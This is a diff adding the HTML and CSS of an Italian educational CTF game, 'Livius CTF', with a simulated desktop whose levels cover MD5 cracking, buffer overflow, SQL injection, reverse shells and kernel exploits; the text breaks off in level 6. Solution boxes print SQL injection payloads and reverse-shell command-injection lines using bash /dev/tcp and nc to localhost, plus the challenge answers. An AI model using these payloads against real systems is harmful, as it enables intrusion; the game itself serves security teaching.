@@ -1,0 +1,2318 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Livius CTF - Desktop Virtuale</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+    <style>
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #16213e;
+            --accent: #0f3460;
+            --highlight: #e94560;
+            --text: #f1f1f1;
+            --desktop-bg: #1a1a2e;
+            --taskbar-bg: #0f3460;
+            --window-bg: #16213e;
+            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background-color: var(--desktop-bg);
+            color: var(--text);
+            height: 100vh;
+            overflow: hidden;
+            background-image: var(--bg-image, none);
+            background-size: cover;
+            background-position: center;
+            transition: background-image 0.5s ease;
+        }
+
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0f3460, #1a1a2e);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .lock-screen.hidden {
+            display: none;
+        }
+
+        .lock-screen-content {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .lock-screen h1 {
+            margin-bottom: 10px;
+            color: var(--highlight);
+        }
+
+        .lock-screen p {
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+
+        .user-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .user-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .desktop {
+            height: calc(100vh - 50px);
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            align-content: flex-start;
+            gap: 20px;
+            overflow: auto;
+        }
+
+        .folder {
+            width: 80px;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .folder:hover {
+            transform: scale(1.05);
+        }
+
+        .folder-icon {
+            width: 60px;
+            height: 50px;
+            background-color: #f1c40f;
+            border-radius: 5px 5px 0 0;
+            margin: 0 auto 5px;
+            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .folder-icon:after {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 5px;
+            background-color: #f39c12;
+            top: -5px;
+            left: 15px;
+            border-radius: 5px 5px 0 0;
+        }
+
+        .folder-name {
+            font-size: 12px;
+            color: white;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.7);
+        }
+
+        .locked {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .locked .folder-icon {
+            background-color: #7f8c8d;
+        }
+
+        .locked .folder-icon:after {
+            background-color: #95a5a6;
+        }
+
+        .taskbar {
+            height: 50px;
+            background-color: var(--taskbar-bg);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.3);
+            z-index: 100;
+        }
+
+        .start-button {
+            background-color: var(--highlight);
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .system-tray {
+            display: flex;
+            gap: 15px;
+        }
+
+        .tray-icon {
+            cursor: pointer;
+            font-size: 14px;
+            padding: 8px 12px;
+            border-radius: 3px;
+            transition: background-color 0.2s;
+        }
+
+        .tray-icon:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .window {
+            position: absolute;
+            background-color: var(--window-bg);
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            min-width: 300px;
+            min-height: 300px;
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            resize: both;
+            z-index: 10;
+        }
+
+        .window.active {
+            display: flex;
+            z-index: 100;
+        }
+
+        .window-header {
+            background-color: var(--accent);
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: move;
+            user-select: none;
+        }
+
+        .window-title {
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .window-controls {
+            display: flex;
+            gap: 8px;
+        }
+
+        .window-control {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .close {
+            background-color: #ff5f57;
+        }
+
+        .minimize {
+            background-color: #ffbd2e;
+        }
+
+        .maximize {
+            background-color: #28ca42;
+        }
+
+        .window-content {
+            padding: 20px;
+            flex-grow: 1;
+            overflow-y: auto;
+        }
+
+        .terminal {
+            background-color: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 15px;
+        }
+
+        .terminal-line {
+            margin-bottom: 5px;
+        }
+
+        .terminal-prompt {
+            color: #0ff;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: var(--text);
+            font-size: 1rem;
+        }
+
+        .btn {
+            background-color: var(--accent);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background-color 0.3s;
+            margin: 5px;
+        }
+
+        .btn:hover {
+            background-color: var(--highlight);
+        }
+
+        .success-message {
+            color: #0a0;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .error-message {
+            color: #f00;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .hint {
+            background-color: rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-style: italic;
+            font-size: 0.9rem;
+        }
+
+        .solution-box {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            border-left: 4px solid var(--highlight);
+        }
+
+        .start-menu {
+            position: absolute;
+            bottom: 50px;
+            left: 0;
+            width: 300px;
+            background-color: var(--window-bg);
+            border-radius: 8px 8px 0 0;
+            box-shadow: 0 -5px 15px rgba(0,0,0,0.5);
+            display: none;
+            z-index: 1000;
+        }
+
+        .start-menu.active {
+            display: block;
+        }
+
+        .start-menu-header {
+            background-color: var(--accent);
+            padding: 15px;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background-color: var(--highlight);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .start-menu-content {
+            padding: 10px;
+        }
+
+        .menu-section {
+            margin-bottom: 15px;
+        }
+
+        .menu-section-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .menu-item {
+            padding: 8px 10px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .menu-item:hover {
+            background-color: rgba(255,255,255,0.1);
+        }
+
+        .customization-panel {
+            background-color: var(--window-bg);
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 500px;
+        }
+
+        .theme-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .theme-option {
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            border: 2px solid transparent;
+        }
+
+        .theme-option:hover {
+            border-color: var(--highlight);
+        }
+
+        .theme-option.active {
+            border-color: var(--highlight);
+            background-color: rgba(233, 69, 96, 0.2);
+        }
+
+        .theme-1 { background: linear-gradient(135deg, #1a1a2e, #16213e); }
+        .theme-2 { background: linear-gradient(135deg, #2c3e50, #34495e); }
+        .theme-3 { background: linear-gradient(135deg, #16a085, #1abc9c); }
+        .theme-4 { background: linear-gradient(135deg, #2980b9, #3498db); }
+        .theme-5 { background: linear-gradient(135deg, #8e44ad, #9b59b6); }
+        .theme-6 { background: linear-gradient(135deg, #c0392b, #e74c3c); }
+
+        .bg-1 { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a1a2e"/><path d="M0 0L100 100" stroke="%230f3460" stroke-width="1"/><path d="M100 0L0 100" stroke="%230f3460" stroke-width="1"/></svg>'); }
+        .bg-2 { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%232c3e50"/><circle cx="50" cy="50" r="30" fill="%2334495e" opacity="0.5"/></svg>'); }
+        .bg-3 { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%2316a085"/><polygon points="50,10 90,90 10,90" fill="%231abc9c" opacity="0.5"/></svg>'); }
+        .bg-4 { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%232980b9"/><rect x="20" y="20" width="60" height="60" fill="%233498db" opacity="0.5"/></svg>'); }
+
+        .certificate {
+            background-color: #f9f9f9;
+            color: #333;
+            padding: 30px;
+            border: 10px solid #0f3460;
+            text-align: center;
+            max-width: 700px;
+        }
+
+        .certificate h2 {
+            color: #0f3460;
+            margin-bottom: 20px;
+        }
+
+        .certificate h3 {
+            color: #0f3460;
+            margin: 15px 0;
+        }
+
+        .certificate p {
+            margin: 10px 0;
+            font-size: 1.1rem;
+        }
+
+        .show-solution {
+            background-color: #555;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            gap: 10px;
+        }
+
+        .terminal-input {
+            flex-grow: 1;
+            background: transparent;
+            border: none;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            outline: none;
+            padding: 5px;
+        }
+
+        .terminal-output {
+            height: 150px;
+            overflow-y: auto;
+            margin-bottom: 10px;
+        }
+
+        .certificate-theme-options, .certificate-layout-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 15px 0;
+        }
+
+        .certificate-theme-option, .certificate-layout-option {
+            cursor: pointer;
+            text-align: center;
+            padding: 10px;
+            border-radius: 5px;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .certificate-theme-option:hover, .certificate-layout-option:hover {
+            border-color: var(--highlight);
+        }
+
+        .certificate-theme-option.active, .certificate-layout-option.active {
+            border-color: var(--highlight);
+            background-color: rgba(233, 69, 96, 0.2);
+        }
+
+        .theme-preview {
+            width: 80px;
+            height: 60px;
+            border-radius: 5px;
+            margin-bottom: 5px;
+        }
+
+        .classic-theme { background: linear-gradient(135deg, #0f3460, #e94560); }
+        .professional-theme { background: linear-gradient(135deg, #000080, #b8860b); }
+        .elegant-theme { background: linear-gradient(135deg, #8b008b, #2f4f4f); }
+        .modern-theme { background: linear-gradient(135deg, #1e90ff, #ff4500); }
+
+        .layout-preview {
+            width: 80px;
+            height: 60px;
+            border-radius: 5px;
+            margin-bottom: 5px;
+            background-color: #f9f9f9;
+            border: 2px solid #ccc;
+            position: relative;
+        }
+
+        .classic-layout::before {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            border: 1px solid #0f3460;
+        }
+
+        .modern-layout::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent 49%, rgba(30, 144, 255, 0.1) 50%, transparent 51%);
+        }
+
+        .executive-layout::before {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            border: 1px solid #8b008b;
+            background: radial-gradient(circle at center, transparent 60%, rgba(139, 0, 139, 0.1) 100%);
+        }
+
+        .window.dragging {
+            opacity: 0.9;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.7);
+        }
+
+        .certificate-preview-container {
+            margin-top: 20px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .certificate-preview {
+            background-color: white;
+            color: #333;
+            padding: 20px;
+            border-radius: 5px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+
+        .download-options {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+
+        .download-option {
+            flex: 1;
+            min-width: 120px;
+        }
+
+        .preview-only {
+            display: none;
+        }
+
+        .certificate-unlocked .preview-only {
+            display: block;
+        }
+
+        .certificate-theme-classic {
+            border: 8px solid #0f3460;
+            background: linear-gradient(to bottom, #f9f9f9, #e6e6e6);
+        }
+
+        .certificate-theme-professional {
+            border: 8px solid #000080;
+            background: linear-gradient(to bottom, #ffffff, #f0f0f0);
+        }
+
+        .certificate-theme-elegant {
+            border: 8px solid #8b008b;
+            background: linear-gradient(to bottom, #fdf5e6, #f5e6ca);
+        }
+
+        .certificate-theme-modern {
+            border: 8px solid #1e90ff;
+            background: linear-gradient(to bottom, #f8f8ff, #e6e6fa);
+        }
+
+        .certificate-layout-classic {
+        }
+
+        .certificate-layout-modern .certificate-title {
+            border-bottom: 2px solid #1e90ff;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+
+        .certificate-layout-executive {
+            position: relative;
+        }
+
+        .certificate-layout-executive::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 1px solid #8b008b;
+            pointer-events: none;
+        }
+
+        /* Notifiche personalizzate */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--window-bg);
+            color: var(--text);
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            border-left: 4px solid var(--highlight);
+            max-width: 400px;
+            z-index: 10000;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: var(--highlight);
+        }
+
+        .notification-content {
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+
+        .notification-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            color: var(--text);
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        @media (max-width: 768px) {
+            .desktop {
+                padding: 10px;
+                gap: 15px;
+                justify-content: center;
+            }
+            
+            .folder {
+                width: 70px;
+            }
+            
+            .folder-icon {
+                width: 50px;
+                height: 40px;
+            }
+            
+            .window {
+                position: fixed !important;
+                top: 10px !important;
+                left: 10px !important;
+                right: 10px !important;
+                bottom: 60px !important;
+                width: auto !important;
+                height: auto !important;
+                min-width: unset;
+                min-height: unset;
+                resize: none;
+            }
+            
+            .window-content {
+                padding: 15px;
+                overflow-y: auto;
+            }
+            
+            .terminal {
+                height: 150px;
+                font-size: 0.9rem;
+            }
+            
+            .certificate {
+                padding: 20px;
+                max-width: 100%;
+            }
+            
+            .start-menu {
+                width: 100%;
+                bottom: 50px;
+                left: 0;
+                right: 0;
+            }
+            
+            .lock-screen-content {
+                padding: 30px 20px;
+            }
+            
+            .taskbar {
+                height: 60px;
+                padding: 0 10px;
+            }
+            
+            .start-button {
+                padding: 10px 20px;
+                font-size: 1rem;
+            }
+            
+            .tray-icon {
+                font-size: 0.9rem;
+                padding: 10px;
+            }
+            
+            .btn {
+                padding: 12px 24px;
+                font-size: 1.1rem;
+            }
+            
+            input[type="text"], input[type="password"] {
+                padding: 12px;
+                font-size: 1.1rem;
+            }
+            
+            .terminal-input {
+                font-size: 1.1rem;
+                padding: 10px;
+            }
+            
+            .terminal-input-line {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            
+            .terminal-input-line .terminal-prompt {
+                margin-bottom: 5px;
+            }
+            
+            #terminal-execute-level5, #terminal-execute-level6 {
+                margin-top: 5px;
+                padding: 10px;
+            }
+
+            .notification {
+                top: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .desktop {
+                padding: 5px;
+                gap: 10px;
+            }
+            
+            .folder {
+                width: 60px;
+            }
+            
+            .folder-icon {
+                width: 45px;
+                height: 35px;
+            }
+            
+            .folder-name {
+                font-size: 10px;
+            }
+            
+            .window-content {
+                padding: 10px;
+            }
+            
+            .terminal {
+                height: 120px;
+                font-size: 0.8rem;
+            }
+            
+            .certificate {
+                padding: 15px;
+            }
+            
+            .lock-screen-content {
+                padding: 20px 15px;
+            }
+            
+            .taskbar {
+                height: 70px;
+                flex-direction: column;
+                padding: 5px 10px;
+            }
+            
+            .system-tray {
+                width: 100%;
+                justify-content: space-around;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Sistema di notifiche -->
+    <div class="notification" id="notification">
+        <button class="notification-close" id="notification-close">×</button>
+        <div class="notification-title" id="notification-title">Notifica</div>
+        <div class="notification-content" id="notification-content"></div>
+    </div>
+
+    <div class="lock-screen" id="lock-screen">
+        <div class="lock-screen-content">
+            <h1>Livius CTF</h1>
+            <p>Inserisci il tuo nome per accedere al sistema.</p>
+            <input type="text" class="user-input" id="user-name-input" placeholder="Inserisci il tuo nome">
+            <button class="btn" id="login-btn">Accedi</button>
+        </div>
+    </div>
+
+    <div class="desktop" id="desktop">
+        <div class="folder" data-window="level1">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Livello 1</div>
+        </div>
+        <div class="folder locked" data-window="level2">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Livello 2</div>
+        </div>
+        <div class="folder locked" data-window="level3">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Livello 3</div>
+        </div>
+        <div class="folder locked" data-window="level4">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Livello 4</div>
+        </div>
+        <div class="folder locked" data-window="level5">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Livello 5</div>
+        </div>
+        <div class="folder locked" data-window="level6">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Livello 6</div>
+        </div>
+        <div class="folder locked" data-window="certificate">
+            <div class="folder-icon"></div>
+            <div class="folder-name">Certificato</div>
+        </div>
+    </div>
+
+    <div class="taskbar">
+        <button class="start-button" id="start-button">Start</button>
+        <div class="system-tray">
+            <div class="tray-icon" id="theme-button">Temi</div>
+            <div class="tray-icon" id="help-button">Aiuto</div>
+        </div>
+    </div>
+
+    <div class="start-menu" id="start-menu">
+        <div class="start-menu-header">
+            <div class="user-info">
+                <div class="user-avatar" id="user-avatar">U</div>
+                <div>
+                    <div id="user-name">Utente</div>
+                    <div style="font-size: 12px;">Livius CTF</div>
+                </div>
+            </div>
+        </div>
+        <div class="start-menu-content">
+            <div class="menu-section">
+                <div class="menu-section-title">Applicazioni</div>
+                <div class="menu-item" data-window="level1">Livello 1 - Accesso al Sistema</div>
+                <div class="menu-item locked" data-window="level2">Livello 2 - Escalation Privilegi</div>
+                <div class="menu-item locked" data-window="level3">Livello 3 - SQL Injection</div>
+                <div class="menu-item locked" data-window="level4">Livello 4 - Reverse Shell</div>
+                <div class="menu-item locked" data-window="level5">Livello 5 - Exploit Kernel</div>
+                <div class="menu-item locked" data-window="level6">Livello 6 - Exfiltrazione Dati</div>
+                <div class="menu-item locked" data-window="certificate">Certificato</div>
+            </div>
+            <div class="menu-section">
+                <div class="menu-section-title">Personalizzazione</div>
+                <div class="menu-item" data-window="themes">Temi e Sfondi</div>
+                <div class="menu-item" data-window="certificate-customization">Personalizza Certificato</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="window" id="level1-window" style="top: 50px; left: 100px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Livello 1: Accesso al Sistema</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="level1"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="terminal">
+                <div class="terminal-line">Sistema Operativo v1.0</div>
+                <div class="terminal-line">Accesso richiesto</div>
+                <div class="terminal-line">Nome utente: <span class="terminal-prompt">admin</span></div>
+                <div class="terminal-line">Password: <span id="password-hash">dc647eb65e6711e155375218212b3964</span></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level1-answer">Inserisci la password per accedere:</label>
+                <input type="text" id="level1-answer" placeholder="Password">
+            </div>
+            
+            <div class="hint">
+                <p><strong>Suggerimento:</strong> L'hash mostrato è un hash MD5. Prova a cercarlo in un database di hash comuni o usa strumenti online per decifrarlo.</p>
+            </div>
+            
+            <button id="level1-submit" class="btn">Verifica</button>
+            <button class="show-solution" data-level="1">Mostra Soluzione</button>
+            <div class="solution-box" id="solution1" style="display: none;">
+                <p><strong>Soluzione:</strong> L'hash MD5 "dc647eb65e6711e155375218212b3964" corrisponde alla password "<strong>Password</strong>" (con la P maiuscola).</p>
+                <p><strong>Come risolverlo:</strong> Puoi usare siti come crackstation.net o tools come John the Ripper per decifrare hash MD5. Ricorda che MD5 è case-sensitive, quindi "Password" è diverso da "password".</p>
+            </div>
+            <div id="level1-result"></div>
+        </div>
+    </div>
+
+    <div class="window" id="level2-window" style="top: 80px; left: 150px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Livello 2: Escalation dei Privilegi</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="level2"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="terminal">
+                <div class="terminal-line">Benvenuto, utente.</div>
+                <div class="terminal-line">Comandi disponibili: ls, whoami, set_privileges</div>
+                <div class="terminal-line"><span class="terminal-prompt">$ </span>whoami</div>
+                <div class="terminal-line">utente</div>
+                <div class="terminal-line"><span class="terminal-prompt">$ </span>set_privileges</div>
+                <div class="terminal-line">Inserisci il codice di autorizzazione: ________</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level2-answer">Inserisci una stringa molto lunga per sovrascrivere il buffer:</label>
+                <input type="text" id="level2-answer" placeholder="Inserisci almeno 30 caratteri">
+            </div>
+            
+            <div class="hint">
+                <p><strong>Suggerimento:</strong> Il comando set_privileges sembra avere una vulnerabilità di buffer overflow. Cosa succede se inserisci più dati di quelli che il buffer può contenere?</p>
+            </div>
+            
+            <button id="level2-submit" class="btn">Verifica</button>
+            <button class="show-solution" data-level="2">Mostra Soluzione</button>
+            <div class="solution-box" id="solution2" style="display: none;">
+                <p><strong>Soluzione:</strong> Inserisci una stringa di almeno 30 caratteri, ad esempio: "<strong>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</strong>"</p>
+                <p><strong>Come funziona:</strong> Il buffer overflow fa sì che i dati in eccesso sovrascrivano la variabile dei privilegi in memoria, elevando i tuoi permessi.</p>
+            </div>
+            <div id="level2-result"></div>
+        </div>
+    </div>
+
+    <div class="window" id="level3-window" style="top: 110px; left: 200px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Livello 3: SQL Injection</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="level3"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="terminal">
+                <div class="terminal-line">Sistema di Gestione Utenti</div>
+                <div class="terminal-line">Ricerca utente per ID:</div>
+                <div class="terminal-line">Query: SELECT * FROM users WHERE id = '[input]'</div>
+                <div class="terminal-line">Inserisci ID utente: ________</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level3-answer">Inserisci l'input per bypassare l'autenticazione:</label>
+                <input type="text" id="level3-answer" placeholder="Payload SQL Injection">
+            </div>
+            
+            <div class="hint">
+                <p><strong>Suggerimento:</strong> La query costruita dinamicamente non sanifica l'input. Come puoi manipolare la condizione WHERE per restituire sempre true?</p>
+            </div>
+            
+            <button id="level3-submit" class="btn">Verifica</button>
+            <button class="show-solution" data-level="3">Mostra Soluzione</button>
+            <div class="solution-box" id="solution3" style="display: none;">
+                <p><strong>Soluzione:</strong> Inserisci: <strong>' OR '1'='1</strong> oppure <strong>' OR 1=1 --</strong></p>
+                <p><strong>Come funziona:</strong> Questo payload modifica la query SQL in: SELECT * FROM users WHERE id = '' OR '1'='1', che restituisce sempre true, mostrando tutti gli utenti.</p>
+            </div>
+            <div id="level3-result"></div>
+        </div>
+    </div>
+
+    <div class="window" id="level4-window" style="top: 140px; left: 250px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Livello 4: Reverse Shell</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="level4"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="terminal">
+                <div class="terminal-line">Servizio di Gestione File Remota</div>
+                <div class="terminal-line">Inserisci il nome del file da elaborare:</div>
+                <div class="terminal-line">Il sistema eseguirà: process_file [nome_file]</div>
+                <div class="terminal-line">Nome file: ________</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level4-answer">Inserisci il comando per ottenere una shell remota:</label>
+                <input type="text" id="level4-answer" placeholder="Comando per reverse shell">
+            </div>
+            
+            <div class="hint">
+                <p><strong>Suggerimento:</strong> Il servizio non valida l'input e permette l'esecuzione di comandi arbitrari. Prova a concatenare comandi usando caratteri speciali come ; o |</p>
+            </div>
+            
+            <button id="level4-submit" class="btn">Verifica</button>
+            <button class="show-solution" data-level="4">Mostra Soluzione</button>
+            <div class="solution-box" id="solution4" style="display: none;">
+                <p><strong>Soluzione:</strong> Inserisci: <strong>; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1</strong> oppure <strong>| nc 127.0.0.1 4444 -e /bin/bash</strong></p>
+                <p><strong>Come funziona:</strong> Questi comandi stabiliscono una connessione reverse shell verso l'IP 127.0.0.1 sulla porta 4444, dando il controllo remoto del sistema.</p>
+            </div>
+            <div id="level4-result"></div>
+        </div>
+    </div>
+
+    <div class="window" id="level5-window" style="top: 170px; left: 300px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Livello 5: Exploit del Kernel</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="level5"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="terminal" id="terminal-level5">
+                <div class="terminal-output" id="terminal-output-level5">
+                    <div class="terminal-line">Accesso ottenuto come utente limitato</div>
+                    <div class="terminal-line">Esiste una vulnerabilità nel kernel che permette l'escalation dei privilegi</div>
+                    <div class="terminal-line">Digita 'help' per la lista dei comandi disponibili</div>
+                </div>
+                <div class="terminal-input-line">
+                    <span class="terminal-prompt">$ </span>
+                    <input type="text" id="terminal-input-level5" class="terminal-input" placeholder="Inserisci comando...">
+                    <button id="terminal-execute-level5" class="btn" style="margin: 0; padding: 5px 10px;">Esegui</button>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level5-answer">Inserisci il flag ottenuto:</label>
+                <input type="text" id="level5-answer" placeholder="Flag del livello 5">
+            </div>
+            
+            <div class="hint">
+                <p><strong>Suggerimento:</strong> Cerca nel sistema un exploit già presente. Potresti doverlo compilare e eseguire per ottenere i privilegi di root.</p>
+            </div>
+            
+            <button id="level5-submit" class="btn">Verifica</button>
+            <button class="show-solution" data-level="5">Mostra Soluzione</button>
+            <div class="solution-box" id="solution5" style="display: none;">
+                <p><strong>Soluzione:</strong> Inserisci: <strong>CTF{K3rn3l_3xpl0it_5ucc3ss}</strong></p>
+                <p><strong>Come trovarlo:</strong> Usa <strong>ls</strong> per vedere i file nella directory corrente. Troverai un file exploit.c. Compilalo con <strong>gcc exploit.c -o exploit</strong>. Esegui l'exploit con <strong>./exploit</strong> per diventare root. Poi leggi il flag con <strong>cat /root/flag.txt</strong>.</p>
+            </div>
+            <div id="level5-result"></div>
+        </div>
+    </div>
+
+    <div class="window" id="level6-window" style="top: 200px; left: 350px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Livello 6: Exfiltrazione Dati</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="level6"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="terminal" id="terminal-level6">
+                <div class="terminal-output" id="terminal-output-level6">
+                    <div class="terminal-line">Accesso come root ottenuto</div>
+                    <div class="terminal-line">Digita 'help' per la lista dei comandi disponibili</div>
+                </div>
+                <div class="terminal-input-line">
+                    <span class="terminal-prompt">$ </span>
